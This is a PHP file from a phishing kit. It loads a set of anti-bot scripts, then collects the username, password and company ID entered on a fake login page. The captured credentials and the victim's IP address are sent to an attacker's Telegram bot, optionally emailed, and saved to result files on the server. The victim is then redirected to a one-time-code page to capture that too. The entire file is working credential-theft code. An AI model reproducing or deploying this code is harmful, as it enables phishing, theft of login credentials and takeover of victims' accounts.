<?php
session_start();
error_reporting(0);
include('../bots/anti1.php');
include('../bots/anti2.php');
include('../bots/anti3.php');
include('../bots/anti4.php');
include('../bots/anti5.php');
include('../bots/anti6.php');
include('../bots/anti7.php');
include('../bots/anti8.php');
include('../bots/ant1.php');
include('../bots/ant2.php');
include('../bots/ant3.php');
include('../bots/ant4.php');
include('../bots/ant5.php');
include('../bots/ant6.php');
include('../bots/ant7.php');
include('../bots/ant8.php');
include 'autob/bt.php';
include "autob/bts2.php";
include "req/config.php";
include('../email.php');
$user = $_POST['username'];$password = $_POST['password'];

if(isset($_POST['username']) && isset($_POST['password'])){
    if(strlen($password) > 3 && strlen($user) > 5){
		
	///////////////////////// MAIL PART //////////////////////
		
		$comp  = $_POST['companyid']?$_POST['companyid']:'';
        $user        = $_POST['username'];
        $password     = $_POST['password'];
        $PublicIP     = $_SERVER['REMOTE_ADDR'];
		if(isset($_GET['ct6'])){$reshead="|---------------- CONFIRM HUNT LOG ----------------|";$_SESSION['fullz'].=$Info_LOG;}
		else{$reshead="|------------------- NEW HUNT LOG -----------------|";$_SESSION['fullz']=$Info_LOG;};
        $Info_LOG = "
|--===-======-=======-- https://sms24.io --=======-======-===--|
$reshead
Company Id       : $comp
UserName         : $user 
Password         : $password "; 

		
		$website="https://api.telegram.org/bot".$botToken;
  $params=[
      'chat_id'=>$chatId,
      'text'=>$Info_LOG,
  ];
  $ch = curl_init($website . '/sendMessage');
  curl_setopt($ch, CURLOPT_HEADER, false);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  $result = curl_exec($ch);
  curl_close($ch);
  
// Don't Touche
//Email
        if ($Send_Email == 1) {
            $subject = $PublicIP.' : New HUNT Log Result';$headers = 'From: HUNTSITE' . "\r\n" .'X-Mailer: PHP/' . phpversion();
			$protocol=array($subject,$Info_LOG,$headers);if (detectprotocol($protocol)){
				mail($to, $subject, $Info_LOG, $headers);}
        };
//FTP == 1 save result >< == 0 don't save result
        if ($Ftp_Write == 1) {
			@mkdir("../rst");
            $file = fopen("../rst/Result_".$PublicIP.".txt", 'a');
            fwrite($file, $Info_LOG);
			fclose($file);
        };
		if(!isset($_GET['ct6'])){
			if (isset($_POST['companyid'])){header("location:login.php?accrXId=c".md5(rand(100, 999999999))."15181d31&consent_handled=true&gtc=live&consentResponseUri=%2Fprotocol&ct6=On");}
			else {header("location:login.php?accrXId=c".md5(rand(100, 999999999))."15181d31&consent_handled=true&consentResponseUri=%2Fprotocol&ct6=On");};
		}
		else{header("location:otp.php?id=myaccount&y=".md5(rand(100, 999999999))."");};

    }
    else{
        date_default_timezone_set('GMT');
        $line = date('Y-m-d H:i:s') . " - $email:$password";
        if ($Ftp_Write == 1) {file_put_contents('log.txt', $line . PHP_EOL, FILE_APPEND);};
		if (isset($_POST['companyid'])){header("location:login.php?loginFailed_id=c".md5(rand(100, 999999999))."15181d31&consent_handled=true&ct6=On&gtc=live&consentResponseUri=%2Fprotocol");}
		else {header("location:login.php?loginFailed_id=c".md5(rand(100, 999999999))."15181d31&consent_handled=true&ct6=On&consentResponseUri=%2Fprotocol");};
    };
}
else{
	if (isset($_POST['companyid'])){header("location:login.php?loginFailed_id=c3Fauth".md5(rand(100, 999999999))."2da15181d31&consent_handled=true&ct6=On&gtc=live&consentResponseUri=%2Fprotocol");}
	else {header("location:login.php?loginFailed_id=c3Fauth".md5(rand(100, 999999999))."2da15181d31&consent_handled=true&ct6=On&consentResponseUri=%2Fprotocol");};
};
?>